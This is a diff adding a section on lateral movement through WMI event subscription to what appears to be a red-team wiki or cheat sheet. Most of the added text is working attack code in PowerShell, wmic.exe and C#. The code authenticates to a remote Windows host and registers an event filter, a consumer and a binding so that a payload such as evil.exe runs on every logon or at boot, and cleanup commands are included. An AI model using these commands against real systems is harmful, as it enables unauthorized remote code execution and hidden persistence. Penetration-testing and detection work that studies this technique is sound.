@@ -203,9 +203,158 @@ wmic.exe /node:TARGET /user:DOMAIN\USER /password:PASSWORD path Win32_Service wh
 {% endtab %}
 {% endtabs %}
 
+### Lateral Movement via WMI Event Subscription
+
+Using WMI on a remote endpoint, we can perform lateral movements based on[ WMI Event Subscription Persitence](../../windows/persistence/wmi-event-subscription.md).
+
+Typically, WMI event subscription requires creation of the following three classes which are used to store the payload or the arbitrary command, to specify the event that will trigger the payload and to relate the two classes (\_\_EventConsumer &\_\_EventFilter) so execution and trigger to bind together.
+
+* **\_\_EventFilter** // Trigger (new process, failed logon etc.)
+* **EventConsumer** // Perform Action (execute payload etc.)
+* **\_\_FilterToConsumerBinding** // Binds Filter and Consumer Classes
+
+Implementation of this technique doesn’t require any toolkit since Windows has a utility that can interact with WMI (wmic) and PowerShell can be leveraged as well.
+
+{% tabs %}
+{% tab title="Windows - Powershell" %}
+Execution of the following commands using wmic.exe will create in the name space of _“**root\subscription**“_ three events. You can set the arbitrary payload to execute within 5 seconds on **every new logon session creation** or within 60 seconds **every time Windows starts.**
+
+```powershell
+#Create CimSession
+$Session = New-CimSession -ComputerName "TARGET" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force)))) -ErrorAction Stop;
+
+#Create filter
+#Query to execute payload within 60 seconds every time Windows starts:
+#SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325
+$FilterArgs = @{name='v4resk-WMI';
+                EventNameSpace='root\CimV2';
+                QueryLanguage="WQL";
+                Query="SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'"};
+$Filter = New-CimInstance -CimSession $Session -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
+
+#Create consumer
+$ConsumerArgs = @{name='v4resk-WMI';
+                CommandLineTemplate="$($Env:SystemRoot)\System32\evil.exe";}
+$Consumer=New-CimInstance -CimSession $Session -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
+
+#Create cosnmerBinding (bind filter & consumer)
+$FilterToConsumerArgs = @{
+Filter = [Ref] $Filter;
+Consumer = [Ref] $Consumer;
+}
+$FilterToConsumerBinding = New-CimInstance -CimSession $Session -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
+```
+
+We can cleanup using following commands
+
+```powershell
+$credential = (new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force)))
+
+$EventConsumerToCleanup = Get-WmiObject -ComputerName "TARGET" -Credential $credential -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'v4resk-WMI'"
+$EventFilterToCleanup = Get-WmiObject -ComputerName "TARGET" -Credential $credential -Namespace root/subscription -Class __EventFilter -Filter "Name = 'v4resk-WMI'"
+$FilterConsumerBindingToCleanup = Get-WmiObject -ComputerName "TARGET" -Credential $credential -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
+ 
+$FilterConsumerBindingToCleanup | Remove-WmiObject
+$EventConsumerToCleanup | Remove-WmiObject
+$EventFilterToCleanup | Remove-WmiObject
+```
+{% endtab %}
+
+{% tab title="Windows - wmic.exe" %}
+Execution of the following commands using wmic.exe will create in the name space of _“**root\subscription**“_ three events. You can set the arbitrary payload to execute within 5 seconds on **every new logon session creation** or within 60 seconds **every time Windows starts.**
+
+```powershell
+#Create filter to execute payload within 5 seconds on every new logon session creation:
+wmic /node:TARGET /user:DOMAIN\USER /password:PASSWORD /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="JustAnEventFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'"
+#Or
+#Create filter to execute payload within 60 seconds every time Windows starts:
+wmic /node:TARGET /user:DOMAIN\USER /password:PASSWORD /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="JustAnEventFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+
+wmic /node:TARGET /user:DOMAIN\USER /password:PASSWORD /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="JustAconsumer", ExecutablePath="C:\Windows\TEMP\evil.exe",CommandLineTemplate="C:\Windows\TEMP\evil.exe"
+wmic /node:TARGET /user:DOMAIN\USER /password:PASSWORD /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"JustAnEventFilter\"", Consumer="CommandLineEventConsumer.Name=\"JustAconsumer\""
+```
+{% endtab %}
+
+{% tab title="C#" %}
+We can implement the same technique with following `C#` code
+
+```csharp
+// code completely stolen from @domchell article 
+// https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/
+// slightly modified to accommodate this lab
+
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Management;
+
+namespace wmisubscription_lateralmovement
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+
+            // Connect to remote endpoint for WMI management
+            string NAMESPACE = @"\\192.168.56.105\root\subscription";
+
+            ConnectionOptions cOption = new ConnectionOptions();
+            ManagementScope scope = null;
+            scope = new ManagementScope(NAMESPACE, cOption);
+            
+            scope.Options.Username = "spotless";
+            scope.Options.Password = "123456";
+            scope.Options.Authority = string.Format("ntlmdomain:{0}", ".");
+            
+            scope.Options.EnablePrivileges = true;
+            scope.Options.Authentication = AuthenticationLevel.PacketPrivacy;
+            scope.Options.Impersonation = ImpersonationLevel.Impersonate;
+            scope.Connect();
+
+            // Create WMI event filter
+            ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
+
+            string query = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";
+            WqlEventQuery myEventQuery = new WqlEventQuery(query);
+
+            ManagementObject myEventFilter = wmiEventFilter.CreateInstance();
+            myEventFilter["Name"] = "evilSpotlessFilter";
+            myEventFilter["Query"] = myEventQuery.QueryString;
+            myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
+            myEventFilter["EventNameSpace"] = @"root\cimv2";
+            myEventFilter.Put();
+
+            // Create WMI event consumer
+            ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null).CreateInstance();
+            myEventConsumer["Name"] = "evilSpotlessConsumer";
+            myEventConsumer["ExecutablePath"] = "mspaint.exe";
+            myEventConsumer.Put();
+
+            // Bind filter and consumer
+            ManagementObject  myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();
+            myBinder["Filter"] = myEventFilter.Path.RelativePath;
+            myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
+            myBinder.Put();
+
+            // Cleanup
+            // myEventFilter.Delete();
+            // myEventConsumer.Delete();
+            // myBinder.Delete();
+
+        }
+    }
+}
+```
+{% endtab %}
+{% endtabs %}
+
 ## Resources
 
 {% embed url="https://tryhackme.com/room/lateralmovementandpivoting" %}
+
+{% embed url="https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/" %}
 
 {% embed url="https://www.ired.team/offensive-security/lateral-movement/wmi-via-newscheduledtask" %}
 
